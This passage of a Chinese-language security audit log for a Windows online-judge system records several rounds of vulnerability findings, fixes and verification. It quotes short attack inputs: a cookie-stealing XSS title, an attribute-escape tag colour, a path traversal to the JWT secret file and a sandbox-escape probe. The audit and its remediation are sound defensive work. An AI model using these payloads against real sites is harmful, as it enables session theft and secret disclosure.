| D-M10 | SPJ/scorer 同步阻塞 | **未修复**。`runInContext` 同步执行，长 SPJ 会卡住单线程事件循环 |
| D-M12 | taskkill `spawnSync` 阻塞 | **未修复**。超时杀进程仍同步等待 |
| D-M13 | 重启后孤儿进程 | **未修复**。无启动时回收逻辑 |
| D-M14/M15 | CDN 无 SRI / localStorage 存 token | **未修复（前端）**。无 SRI 仍为主要供应链风险面 |
| D-L4 | uploads 匿名可读 | **未修复**。静态暴露 `/uploads` |
| D-L5 | WA diff 泄露期望输出 | **未修复（设计取舍）**。diff 接口直读 `output_file`，已由写入侧 `safeFileName` 收窄，但 `submissions.js:277` 读取时无包含校验（历史脏数据风险） |
| D-L6 | requireRole 角色常数 | **未修复**。`Math.min` 语义不直观但无安全影响 |
| D-L12-15 | 沙箱子项（环境变量/argv/元数据/ACL 竞态） | **未修复**。均为低优先级加固项 |
| D-L17 | 冻结时区显示 | **未修复**。冻结按钮未记录冻结时刻 |
| D-I6 | `npm test` 脚本损坏 | **未修复**。`node --test test/` 在 Node 26 下 `MODULE_NOT_FOUND`，建议改 `node --test test/*.test.js` |
| M1/M2 | 前端 `fixUrl` 协议相对 URL、`showToast` innerHTML、`loadCaptcha` innerHTML | **未修复（前端）**。`api.js:369/480` 仍为 innerHTML，调用方已转义、后端 SVG 自产，风险低 |

### 7.3 新增风险 / 需留意

- **`readTestdata` 包含校验可能拒绝合法相对路径**：`judge.js` 现要求解析后路径落在 `PROBLEMS_ROOT` 内；若历史库中 testdata 以相对路径存储（解析后指向 CWD 而非 problems 目录），会误判为非法。**未实测**，建议对有存量数据的环境做一次导入后判题冒烟。
- **`submissions.js:277` WA diff 读取无包含校验**：写入侧已收窄，但读取侧未同步 `readTestdata` 式校验，属纵深防御缺口（低危，历史脏数据场景）。
- **`TRUST_PROXY` 需管理员显式确认**：默认关闭会破坏多级反代下的真实 IP 识别，若部署在 Nginx 之后需在 `.env` 显式开启，否则限流按直连 IP 计。

### 7.4 下一轮建议优先级

1. **P0**：D-H3 SPJ 改子进程执行（消除同步阻塞 + vm 逃逸，同时解决 D-M10/D-M12 的同类同步问题）。
2. **P1**：C-1 默认 Low-IL/ACL 隔离（管理员部署）；`submissions.js:277` 补读取侧包含校验；前端 CDN 加 SRI。
3. **P2**：D-M2 图形化验证码、D-M13 孤儿进程回收、D-I6 测试脚本修复、D-L14 ACL 竞态、D-L17 冻结时刻。

---

## 八、第七轮修复提交（7f05a4a）重扫验证

提交内容：`SPJ子进程化、taskkill异步化、沙箱默认Low-IL、D-L14元数据目录防御、启动时孤儿进程回收、WA diff读取侧包含校验+16MB、前端CDN SRI、tailwind自托管、验证码CSPRNG+扭曲滤镜、unfrozen_at UTC、ratelimit unref修复npm test挂起`。

### 8.1 已确认修复（✅ 验证通过）

| 编号 | 问题 | 修复位置与验证结论 |
|---|---|---|
| D-H3 | SPJ `vm.runInContext` 同步执行 + 逃逸 | `judge.js:108-180` 改为 spawn 独立 node 子进程（进程级隔离）+ 子进程内 vm 双层防护 + JSON 字面量注入。**实测**：AC/WA 判定正确、`while(true)` 约 1s 被 kill（不阻塞事件循环）、`require` 不可达、`this.constructor.constructor` 逃逸返回 false ✅ |
| D-M10 | SPJ/scorer 同步阻塞 | 同上，子进程化彻底消除（`compareOutput` 已改 `await` 三处调用点）✅ |
| D-M12 | taskkill `spawnSync` 阻塞 | `executor.js:199` 改异步 `spawn` + `unref()`，fire-and-forget ✅ |
| C-1 | 非管理员无隔离 | `sandbox_runner.cpp:790-803` 受限令牌路径**默认降 Low Integrity**（`WINOJ_NO_LOWIL=1` 逃生阀、execMode=2 裸进程不受影响），AppContainer 优先路径不变 ✅（实质改善，见 8.2 风险） |
| D-L14 | `_meta.json` 目录型预创建 | `sandbox_runner.cpp:664-672` `ensureMetaPath` 写入前若为目录则整树清理；`writeMeta` 统一走该路径 ✅ |
| D-M13 | 重启后孤儿进程 | `executor.js:cleanupOrphanProcesses`（:431-472）+ `server.js:310-312` 启动时回收（按命令行匹配 sandbox tempdir，排除自身 PID；仅查 Windows/PowerShell + taskkill，非 Windows 用 pkill + 清理临时目录）✅ |
| D-L5(读取侧)/D-H2 | WA diff 直读任意路径 | `submissions.js:277-288` 增加 PROBLEMS_ROOT 包含校验 + ≤16MB ✅（**但见 8.3 回归：条件写反，实际不生效**） |
| D-M14 | 前端 CDN 无 SRI | 全部 CDN `<script>/<link>` 补 `integrity` + `crossorigin`（KaTeX/marked/DOMPurify/CodeMirror/echarts/diff 等 56 处）✅ |
| M1(前端) | tailwind play CDN 运行时依赖 | `cdn.tailwindcss.com` 全部替换为自托管 `/js/tailwind.js`（451KB 离线运行时）✅ |
| D-M2 | 验证码 `Math.random` | `captcha.js:16-20` 改 `crypto.randomInt`（CSPRNG）+ 2 条贝塞尔干扰 + `feTurbulence/feDisplacementMap` 扭曲滤镜 ✅（**见 8.2 残留：`<text>` 元素仍可 DOM 直接提取**） |
| D-L17 | 冻结时区 | `contests.js:315` `unfrozen_at` 改 `new Date().toISOString()`（UTC ISO 8601）✅ |
| D-I6 | `npm test` 挂起 | `ratelimit.js:48`/`captcha.js:113` 清理定时器 `unref()`；`package.json` test 改为 4 个单测文件。**实测 `npm test` = 56/56 通过** ✅ |

- 全部改动 JS 文件 `node --check` 通过；`sandbox_runner.cpp` 以 g++ -std=c++17 编译通过。
- 已人工复核 SPJ 子进程 wrapper 的引号/JSON 转义构造，并做端到端实测（AC/WA/hang/escape 四例）通过。

### 8.2 新引入风险（⚠️ 需 E2E 验证）

| 风险 | 说明 |
|---|---|
| **Low-IL 子进程写 workDir 可能失败** | 受限令牌路径默认 Low IL 后，子进程对 workDir（由 executor 以普通 IL 创建）内文件的**写操作会被拒绝**。对纯 stdin/stdout 的判题无影响（stdio 走 Node 持有管道句柄）；但提交代码若在 cwd 创建文件（freopen 输出、临时文件等）会 `ACCESS_DENIED` 变 RE。**建议用"写文件到 cwd 的提交"做一次冒烟**；若需保留，可在 workDir 创建时对其加 Low-IL 写 ACE |
| **验证码 DOM 直读未消除** | `captcha.js` 仍以 `<text>` 元素渲染明文，SVG DOM 中字符可见，攻击者可解析 DOM 提取；扭曲滤镜只破坏像素级 OCR，不阻止 DOM 提取。缓解：服务端每次校验即失效 + 邮箱 5 次/时失败燃尽 + CSPRNG 防预测。属可接受残留，勿宣称"防 DOM 提取" |

### 8.3 关键回归（🔴 P0 必须修）

**`readTestdata` 与 WA diff 的包含校验把"合法绝对路径"也拒绝了 → 文件型测试数据全部判题失败。**

- 现状：`problems.js` 的 `/testdata`（:318-329）与 `/testdata-zip`（:459-482）路由把 testdata 以**绝对路径**（`path.join(problemDir,…)`）写入 `test_cases.input_file/output_file`；`/import`（:1112-1113）写入 `safeFileName` 纯文件名（相对）。
- 而 `judge.js:86-102 readTestdata` 的校验为：
  ```js
  if (path.isAbsolute(filePath) || !resolved.startsWith(problemsRoot + path.sep)) throw …
  ```
  该逻辑对**绝对路径一律拒绝**，导致上传/zip 路由落库的绝对路径 `F:\winoj\…\problems\3\case1.in` 全部抛 `Invalid test data path` → 每个测试点 `system_error`；导入路由的相对文件名经 `path.resolve`（以 backend 为 CWD）解析后也不在 problemsRoot 下，同样被拒。**任何使用文件型 testdata 的题目都无法判题。**
- 同理 `submissions.js:283` 新增校验为 `if (!path.isAbsolute(waDetail.output_file) && resolved.startsWith(…))` —— 条件**反过来写错了**：绝对路径（上传/zip 落库形式）因 `!isAbsolute` 为 false 而**永不读取**，WA diff 的期望输出恒为空。
- 修复建议（两处统一）：
  ```js
  // 允许绝对路径（只要解析后在 problemsRoot 内），相对路径以 problemsRoot 为基准解析
  const resolved = path.isAbsolute(filePath)
    ? path.normalize(filePath)
    : path.resolve(problemsRoot, filePath);
  if (resolved !== problemsRoot && !resolved.startsWith(problemsRoot + path.sep)) throw …;
  ```
  这样上传/zip 的绝对路径与导入的相对文件名都能读到，而 `../../config/jwt.txt`（解析后越出 problemsRoot）仍被拒，安全语义不变。
- **验证依据**：已用 Node 实测上述三种落库形式的判定结果（全部 REJECTED），并比对提交 8fd58fb 版本确认该回归自第六轮 `readTestdata` 加入包含校验时引入，第七轮未修复、WA diff 处又新增同类错误。

### 8.4 其他观察

- `npm test` 现只跑 4 个单测文件，`security.test.js`/`reset-login.test.js` 两个集成测试被移出默认脚本（仍需先 `npm start`，不算回退但覆盖率下降）。
- `cleanupOrphanProcesses` 的 PowerShell 查询已修复：不再用 `-like '*<tempDir>*'` 字符串拼接，改为经环境变量 `WINOJ_TMP_ESC`（正则转义后的 tempDir）+ `-match` 参数化匹配，并排除 `$env:WINOJ_PARENT_PID`，杜绝单引号/通配符注入。✅ 已单测验证（能正确枚举含 tempDir 的假孤儿进程）。
- `tailwind.js` 为完整 play CDN 运行时（451KB，含 MutationObserver + `console.warn("cdn…should not be used in production")`），已自托管消除第三方依赖，但仍是开发运行时而非构建产物；若做性能收尾可考虑构建静态 CSS（项目无 tailwind.config.js/构建链，改动面大，本轮保留为观察项）。
- **D-L13（沙箱诊断日志混入 stderr + argv 未做 CRT 转义）已修复**：`sandboxLogRaw` 不再默认写 stderr（仅写 `log/sandbox.log`；排障设 `WINOJ_SANDBOX_VERBOSE=1` 才同时输出）；argv→命令行改用标准 `quoteCmdArg()`（MSDN 反斜杠-引号规则）。✅ 验证：空格/引号/尾部反斜杠/`a\\b`/`C:\Program Files\x"y` 参数 100% 往返一致，日志零泄漏进子进程输出，真实 A+B 判题 AC。中文参数乱码为既有 CreateProcessAsUserA ANSI 限制（旧代码同样表现），非本次回归。
- D-M15（前端 localStorage 存 access_token/user）、D-L4（uploads 匿名可读）、D-L5（WA diff 泄露期望输出）经复核为**合理设计取舍**：纯 SPA 无 SSR 下 token 只能存 localStorage（XSS 能读 token 即能冒充用户，缓解点在渲染逃逸）；uploads 是公开题图/头像需匿名展示；WA diff 期望输出是 OJ 惯例。均保持现状，不修改。
- D-L6（requireRole 仅单角色调用、`Math.min` 无影响，已确认无需改）未处理，仍为观察项。
- **D-L12（子进程继承父进程完整环境变量，可能含密钥）已修复**：`buildMinEnvBlock()` 构造最小白名单环境（PATH/SystemRoot/TEMP/TMP/COMPUTERNAME/USERNAME/USERPROFILE/OS/PATHEXT 等），`CreateProcessA` 与 `CreateProcessAsUserA`（AppContainer + 受限令牌）均显式传入。✅ 已单测验证：父进程设置的 `WINOJ_SECRET_TEST`/`MY_SECRET_VAR`/`APISECRET` 在子进程为 `(null)`，PATH 等保留正常；真实 A+B 判题 AC 确认编译/运行无回归。
- **D-L15（Windows `fs.writeFileSync` mode 无效）已修复**：`config.js` 生成 jwt.txt 后，Windows 平台用 `icacls /inheritance:r /grant:r <USER>:(R,W) /grant:r SYSTEM:(F) /grant:r Administrators:(F)` 显式收缩 ACL。✅ 已验证：原先存在的 `Authenticated Users:(M)`/`Users:(RX)` 已移除，仅剩当前用户+SYSTEM+Administrators。

---

## 十、第九轮扫描（设计取舍定稿后全量复查）

> 设计取舍定稿：D-M15（SPA 无 SSR，token 存 localStorage，标准做法）、D-L4（uploads 公开题图/头像，需匿名展示）、D-L5（WA diff 期望输出为 OJ 惯例）**关闭**；D-L6（观察即可）+ tailwind 静态化（性能项）保留为开放项。

### 10.1 新发现 P1（本轮重点）

| 编号 | 文件:行 | 问题 | 建议修复 |
|---|---|---|---|
| **R9-1** | `frontend/pages/admin.html:668, 1534` | **存储型 XSS（教师→管理员提权）**：`onclick="openTestManager(${p.id}, '${escapeHtml(p.title)}')"` 把标题内插进内联事件。`escapeHtml` 输出 `&#39;` 会被 HTML 解析器**先解码**再进 JS，教师创建标题 `x');alert(document.cookie)//` 即可在管理员会话执行（同理 contest title :1534）。 | 不在内联处理器插字符串；改用 `data-id` + `addEventListener`，或只传数字 id、标题从已加载数组查。 |
| **R9-2** | `backend/routes/problems.js:157-167` | **非公开题 IDOR**：D-M7 注释称"仅 staff/作者/参赛者"，但 `inContest` 分支只查"题在任一比赛+登录"，**未校验该用户是参赛者、也未校验比赛已开始**。任意登录用户枚举 id 即可在赛前读非公开题全文（含题目描述与测试点布局）。 | 查 `contest_participants WHERE contest_id=? AND user_id=?` 且比赛已开始；否则 403。 |
| **R9-3** | `backend/services/plagiarism.js:92-142` + `contests.js:351-364` / `problems.js:811` | **查重 O(n²) 阻塞事件循环 + 无去重 + 无限流**：`runTask` 经 `setImmediate` 同步跑全量两两 Jaccard（2000 用户≈200 万对），期间阻塞全部 HTTP/判题；可重复 POST 并发堆积；路由无 rate limit。 | 去重（已存在 running/pending 任务则跳过）+ 路由限流 + 对间 `setImmediate` 让步 + 最大对数上限。 |
| **R9-4** | `backend/services/judge.js:746-753` + `submissions.js:122-127` | **`pending_review` 中断不可恢复**：提交先入 `pending_review`，AI 审查（≤60s）后转 `pending`；若进程在审查窗口内重启，`recoverInterruptedSubmissions` 只回收 `pending/…/judging`，`pending_review` 行永不重新入队，且提交锁将其视为在途 → **该用户永久无法再提交**，需管理员改库。 | 恢复查询纳入 `pending_review`（审查属建议性，直接重新入队），或加 stale 审查 TTL 翻转。 |
| **R9-5** | `backend/src/server.js:175-183` + `uploads.js:130-140` | **`/uploads` 静态挂载匿名可读全部文件**：`express.static` 挂在鉴权路由之前，`GET /api/v1/uploads/:filename` 鉴权路由成死代码；`data/uploads` 内全部文件公开下载。multer 测试数据临时文件（`problems.js:16` dest 同目录，200MB×100）在请求崩溃时残留 → **测试数据/源码 ZIP 匿名泄露**。 | 静态挂载改为走上传表 + 鉴权，或将 multer 临时目录移到非公开路径；崩溃残留文件需启动清理。 |
| **R9-6** | `backend/routes/tags.js:26,55` + `frontend problem.html:38`/`problems.html:125`/`admin.html:848` | **标签颜色未校验 → CSS/属性注入 XSS**：服务端原样存 `color`，前端 `style="background-color: ${t.color}20; color: ${t.color}"`（problem.html 连 `escapeHtml` 都没有）→ 教师可存 `red";onmouseover="…` 属性逃逸或 CSS 注入，危害所有访客。 | 服务端校验 `/^#[0-9a-fA-F]{6}$/`，前端再转义。 |

### 10.2 新发现 P2

| 编号 | 文件:行 | 问题 |
|---|---|---|
| R9-7 | `backend/middleware/ratelimit.js:50-57` | 清理逻辑按"闲置>120s"删除 bucket，无视 `windowMs`：注册 1/h 限流等 ~2 分钟即得新桶，等效降到 1/2-3min。应按 `windowMs` 过期后再清理。 |
| R9-8 | `backend/routes/aiHint.js:9` | `cooldown` Map 无 TTL/上限，随 (user,problem) 对无限增长（内存泄漏，同类问题 ratelimit/captcha 已修）。 |
| R9-9 | `backend/routes/announcements.js:88-95` | PUT `type` 未校验（违反 schema CHECK→500）；`type='contest'` 允许不存在的 `contest_id`（FK→500）或空 `contest_id`（TypeError→500）。POST :47 同源。 |
| R9-10 | `backend/routes/favorites.js:26-35` / `discussions.js:34-53` | `IN (?)` 占位符无上限（20000 个超出 SQLITE_MAX_VARIABLE_NUMBER→500）；讨论回复无 LIMIT 全量物化。 |
| R9-11 | `backend/src/server.js:75` | 请求日志原样插 `req.originalUrl`，未过 `sanitizeLog`（唯一漏网日志点），可注入 ANSI/伪日志行。 |
| R9-12 | `backend/services/judge.js:666-672` | 首 AC 加分竞态：同 (user,problem) 两提交并发判，可能双计 +10。 |
| R9-13 | `backend/config/config.js` | `ai.txt`/`email.txt`/`cors.txt` 无 ACL 加固（仅 jwt.txt 有 icacls+0o600），Windows 本地可读。 |
| R9-14 | `backend/database/db.js:98-117` | `INSERT INTO submissions SELECT *` 位置序迁移，旧表多 ALTER 列则启动即抛错。 |
| R9-15 | `backend/routes/submissions.js:154-190` | 多文件提交只对首文件限 `CODE_LENGTH_LIMIT`，其余文件无上限（可存 ~10MB junk）。 |
| R9-16 | `backend/src/server.js:288-295` | 全局错误处理器对 multer `LIMIT_FILE_SIZE`/文件类型错误统一返回 500（应 413/400）。 |
| R9-17 | `backend/package.json` + `db.js` | 依赖实验性 `node:sqlite`，无 `engines` 字段，Node 18/20 启动即崩（应加 `engines: node>=22.13`）。 |
| R9-18 | `backend/database/db.js:66-67` + schema | 缺 `busy_timeout`（外部写者致 SQLITE_BUSY）；缺热查询索引 `submissions(user_id,id)`、`submissions(user_id,problem_id,status)`。 |
| R9-19 | `frontend api.js:394` | socket.io-client 走 jsdelivr CDN 无 SRI 且 `@4` 主版本不锁定（供应链风险）。 |
| R9-20 | `backend/src/server.js:164` | `config.security?.contact` 无此属性，`/security.txt` 恒回退 github.com。 |
| R9-21 | `backend/services/email.js:65-70` | `email_codes` 已用/过期行永不清理，表无限增长。 |
| R9-22 | `backend/middleware/auth.js:12-14` | `onlineUsers` 清理 interval 未 `unref()`（测试进程不退）。 |
| R9-23 | `backend/services/ideJudge.js` | `ideQueue` 无界数组，无队列上限。 |
| R9-24 | 前端 ~19 处 | `innerHTML += ${err.message}`（如 problem/submission/status/contest/profile 等），现消息为服务端常量，但任一回显请求数据的路径（如 Language '…'）变更渲染方式即 XSS。建议统一 `escapeHtml(err.message)` 或 `textContent`。 |
| R9-25 | `backend/routes/contests.js:73-82` / `problems.js:287-337` | 比赛未校验 `end_time>start_time`；`/testdata` 上传无限流（100×200MB 可写 ~20GB/请求）。 |

### 10.3 其他观察（P3 / 建议）

- 导入导出基准不一致：判题端 `readTestdata` 相对名以 problemsRoot 为基准，导出侧 `problems.js:517` 以 problemDir 为基准（指向 `problems/<id>/` 子目录的相对路径读取不一致，低风险）。
- `runCodeLegacy`（无 sandbox_runner.exe / 非 Windows）以完整服务用户权限裸跑用户代码，无 Job Object/受限令牌/网络隔离，内存限制 Linux 下不生效 → 建议 fail-closed（缺 runner 即拒绝判题），或至少限定非逃逸解释语言。
- `security.txt`/`plagiarism_pairs` 无 FK + `findNextId` 用 `MAX(id)+1` → 删除最高行后 id 复用，查重报告可张冠李戴（建议 AUTOINCREMENT）。
- 隐藏比赛 `join`/`virtual-start`/`announcements`/`discussions` 未按 `is_hidden` 收敛（赛前信息泄露）。
- `ai-testdata`（8192 tokens/90s）与 IDE 判题无 rate limit/队列上限。
- 前端 `upload.html:111,115`、`admin.html:1441` 文件名未转义进内联 handler/href（现 UUID 命名缓解，属纵深防御建议）。
- 后端 `users.js:280-308` 删用户遗留磁盘文件与 `email_codes`；`preferred_language` 无校验/长度上限。

### 10.4 建议下一轮修复优先级

1. **P0 候选**：R9-1（admin XSS，教师→管理员）、R9-2（非公开题赛前泄露）、R9-4（pending_review 永久锁死提交）、R9-5（uploads 匿名泄露测试数据）。
2. **P1**：R9-3（查重阻塞）、R9-6（标签颜色注入）、R9-7（限流绕过）。
3. **P2 批量**：R9-8~R9-25 按"一处修、全类修"模式推进。

### 10.5 第九轮 P0/P1 已修复（✅ 验证通过）

| 编号 | 问题 | 修复位置与验证结论 |
|---|---|---|
| R9-1 | admin 内联事件存储型 XSS（教师→管理员提权） | `admin.html` 两处（openTestManager/showContestProblemManager）移除内联 title 字符串参数，改为只传数字 id + 模块级缓存数组（adminProblemsCache/adminContestsCache）查标题。全站 grep 无残留"内联处理器插 escapeHtml 字符串"模式 ✅ |
| R9-2 | 非公开题赛前 IDOR | `problems.js:157-169` `inContest` 分支改为：JS 侧 `Date` 比较校验比赛已开始（容错 datetime-local/ISO 各格式），且查 `contest_participants` 确认用户是参赛者；否则 403 ✅ |
| R9-3 | 查重 O(n²) 阻塞 + 无去重 + 无限流 | `plagiarism.js`：`runTask` 改 async，每 200 对 `setImmediate` 让出事件循环；`MAX_USERS=2000` 上限防组合爆炸；`activeTasks` Map 同题目并发去重（pending/running 存在则复用）。`problems.js`/`contests.js` 查重路由加 10/5 per-min rate limit。✅ 实测同题并发返回同一 task_id、任务正常 done |
| R9-4 | pending_review 重启后永久锁死提交 | `judge.js recoverInterruptedSubmissions` 的 status 列表纳入 `pending_review`（AI 审查属建议性，直接重新入队判题）✅ |
| R9-5 | testdata 临时文件匿名泄露 | `problems.js:16` multer dest 从 `data/uploads`（匿名可读）改为独立 `data/tmp-uploads`（非公开）；`server.js` 启动时递归清空 `tmp-uploads`（崩溃残留回收）✅ |
| R9-6 | 标签颜色 CSS/属性注入 XSS | `tags.js` POST/PUT 严格校验 `/^#[0-9a-fA-F]{6}$/`，name 加 50 字符上限；前端 problem/problems/admin 三处 `style` 内插加 `escapeHtml` 纵深防御 ✅ |

- 全部改动 `node --check` 通过；`npm test` = 56/56 通过。
- 验证工具：查重去重用真实题目 id 实测（同题并发返回同 task_id，任务 done）；R9-2/R9-4/R9-5 逻辑经代码复核 + 语法校验。

### 10.6 第九轮 P2 批量已修复（R9-7~R9-25，✅ 验证通过）

| 编号 | 问题 | 修复位置与验证结论 |
|---|---|---|
| R9-7 | 限流清理无视 `windowMs`（1/h 限流 ~2min 即失效） | `ratelimit.js` 桶记录自身 `windowMs`，30s 清理定时器按 `now - bucket.windowStart > bucket.windowMs` 逐桶删除 ✅ |
| R9-8 | `aiHint` cooldown Map 无 TTL/上限 | `COOLDOWN_MAX=10000` + `pruneCooldown()` 惰性清理过期冷却条目 ✅ |
| R9-9 | announcements PUT `type`/`contest_id` 未校验 | `type` 限定 `['global','contest']`，type=contest 时校验 `contest_id` 存在 ✅ |
| R9-10 | `IN (?)` 占位符无上限 | favorites `/status` ids 截断 500；discussions 一级 `LIMIT 1000`、二级 `replyIds.slice(0,500)` ✅ |
| R9-11 | 请求日志未过 `sanitizeLog` | `server.js` 请求日志 `req.originalUrl` 加 `sanitizeLog` ✅ |
| R9-12 | 首 AC 加分并发双计 | `judge.js` 改原子占位 `UPDATE submissions SET first_accepted=1 WHERE … AND first_accepted=0`，仅首次 claim 发 Rating；`db.js` 迁移 + `schema.sql` 加列。实测 A=1 B=0（ATOMIC_CLAIM_OK）✅ |
| R9-13 | ai/email/cors 配置无 ACL 加固 | `config.js` 抽 `hardenConfigFileAcl()`（icacls `/inheritance:r` + 当前用户 R,W + SYSTEM F + Administrators F），应用于 jwt/email/ai/cors 读取路径。实测 ai.txt 仅 3 个主体 ✅ |
| R9-14 | `INSERT INTO submissions SELECT *` 位置序迁移 | 改显式列名交集映射（`tableCols('submissions_old')` 过滤后逐列复制），旧表多 ALTER 列不再错位 ✅ |
| R9-15 | 多文件提交只限首文件长度 | 每文件限 `CODE_LENGTH_LIMIT` + 文件名 ≤128 字符 + 文件数 ≤50 ✅ |
| R9-16 | multer 错误笼统返回 500 | 全局错误处理器识别 `MulterError`：LIMIT_FILE_SIZE→413、LIMIT_UNEXPECTED_FILE→400、业务 400 透传 ✅ |
| R9-17 | 无 `engines` 字段（Node 18/20 启动即崩） | `package.json` 加 `engines: node>=22.13.0` ✅ |
| R9-18 | 缺 busy_timeout + 热查询索引 | `PRAGMA busy_timeout=5000`；schema.sql + db.js 加 `(user_id,id)`、`(user_id,problem_id,status)`、`(problem_id,status)` 索引。实测索引已建 ✅ |
| R9-19 | socket.io-client CDN 无 SRI 且 `@4` 不锁定 | 下载 4.8.1 自托管 `frontend/js/socket.io-client.min.js`（与 tailwind 一致），api.js 改 `/js/…` 本地加载 ✅ |
| R9-20 | `config.security?.contact` 不存在，/security.txt 恒回退 github.com | `config.js` 加 `loadSecurityContact()`（可配 `config/security.txt` CONTACT=），缺省回退仓库地址；server.js 读取 ✅ |
| R9-21 | `email_codes` 已用/过期永不清理 | `saveCode` 顺带 `DELETE WHERE used=1 OR datetime(expires_at)<=now` ✅ |
| R9-22 | `onlineUsers` 清理 interval 未 `unref`（测试进程不退） | `auth.js` setInterval 加 `.unref()` ✅ |
| R9-23 | `ideQueue` 无界数组 | `IDE_QUEUE_LIMIT=100`，满则拒入队并标记 system_error ✅ |
| R9-24 | 前端 ~21 处 `innerHTML` 插入 `err.message` | 全站 innerHTML/insertAdjacentHTML 中 err.message 统一 `escapeHtml(err.message)`（alert/textContent 无需改）。grep 确认 0 残留 ✅ |
| R9-25 | 比赛未校验 `end_time>start_time`；/testdata 无限流 | contests POST/PUT 校验时间（合并检查）；`/testdata` 循环前置总大小 ≤200MB 校验（throw + finally cleanup）✅ |

- 全部改动 `node --check` 通过；`npm test` = 56/56 通过。
- 验证工具：R9-12 用脚本实测原子占位；R9-13 用 icacls 实测 ACL；R9-18 用脚本实测索引清单；其余经代码复核 + 语法校验。
- 另顺带完成 10.3 建议项：`users.js` 删用户时清理其 `data/uploads` 磁盘文件（原遗留孤儿文件）。

---

## 九、第八轮修复提交（0228fe9 / d3fdb77）重扫验证

### 9.1 P0 回归已修复并验证 ✅

**`readTestdata` 与 `submissions.js` WA diff 的包含校验重写正确**（两处统一为建议语义）：

- `judge.js readTestdata`（约 :86-105）：绝对路径 `path.normalize`、相对路径 `path.resolve(problemsRoot, filePath)`，仅当 `resolved !== problemsRoot && !resolved.startsWith(problemsRoot + path.sep)` 时拒绝。
- `submissions.js:283-292`：同款逻辑 + `stat.size <= 16MB` 才回读。
- **逻辑仿真验证（6 例全符合预期）**：
  - 上传/zip 落库的绝对路径 `…\problems\3\case1.in` → 正常读取 ✅
  - 导入落库的相对名 `case1.in` → 以 problemsRoot 为基准解析 → 正常读取 ✅
  - `../../config/jwt.txt` → 解析后越出 problemsRoot → REJECTED ✅
  - problems 目录外的绝对路径 → REJECTED ✅
  - problemsRoot 本身 → 放行（`resolved !== problemsRoot` 为 false，读目录抛错被 catch）✅
- **新增残余观察**：相对名（导入形式）按 problemsRoot 解析，而导出侧 `problems.js:517-524` 的 `resolveFilePath` 以 `problemDir`（含题号）为基准；即导入落库的纯文件名实际文件位于 `problems/<id>/` 子目录时，判题端解析根不同。当前导入路由 `input_data`/`output_data` 落库时 `input_file` 留空，不受影响；但**手动构造"仅有 input_file 且指向问题子目录相对路径"的用例会出现读取不一致**。属低风险观察项，建议统一基准为 `problemDir` 或存绝对路径。

### 9.2 Low-IL 写 workDir 标签修复 ✅（代码级验证）

- `sandbox_runner.cpp setLowLabelOnPath` 改经 **SACL（`pNewSacl` 第 7 参）** 写 `SYSTEM_MANDATORY_LABEL_ACE`（完整性标签须放 SACL，DACL 不生效），递归应用到 workDir 全树（:601-662 附近）。
- 标签写入发生在 CreateProcess 之后、进程 resume 之前 → Low-IL 子进程对 workDir 内文件的写操作不再被完整性策略拒绝，`freopen` 输出/临时文件类提交可正常工作。
- 新增 `WINOJ_NO_RELABEL=1` 逃生阀（置位则跳过重标，用于排查）。
- 调用时机推演：`writeMeta`（executor 以 Medium IL 读 `_meta.json`）在标签写入后执行，Medium 读 Low 文件无权限问题 ✅；`useAppContainer` 分支优先级不变，容器标签由 AppContainer 自身保证。
- **说明**：本项仅代码级验证（本机无运行中的 OJ 服务）；建议对"写文件到 cwd 的提交"做一次真实判题冒烟确认（见 9.4）。

### 9.3 其余已确认

- `npm test` 56/56 通过；改动 JS 全部 `node --check` 通过；`sandbox_runner.cpp` 用 `g++ -std=c++17 -O2 -c` 编译通过。
- `.gitignore`：`backend/config/config.js` 已纳入版本控制（`git ls-files` 命中），`backend/config/jwt.txt` 仍被忽略 ✅。
- `d3fdb77` 的 D-L12/D-L15/8.4.1 在上一节已记录验证结果（env 白名单、icacls、孤儿查询参数化）。
- 沙箱环境白名单（`buildMinEnvBlock`）语言兼容性：`LANG_MAP` 各语言（gcc/g++/python/java/node）均通过 PATH 调用，白名单含 PATH/SystemRoot/TEMP/TMP，解释器所需变量齐备，无回归风险。

### 9.4 残余项（未处理）

- **建议冒烟**：Low-IL 标签修复后，真实判题运行"提交代码向 cwd 写文件"用例，确认 `ACCESS_DENIED` 消除。
- 相对路径读取基准不一致（见 9.1 观察）。
- 8.4 已列开放项：D-M15（前端 localStorage）、D-L4（uploads 匿名）、D-L13（沙箱日志混入 stderr）等仍待处理。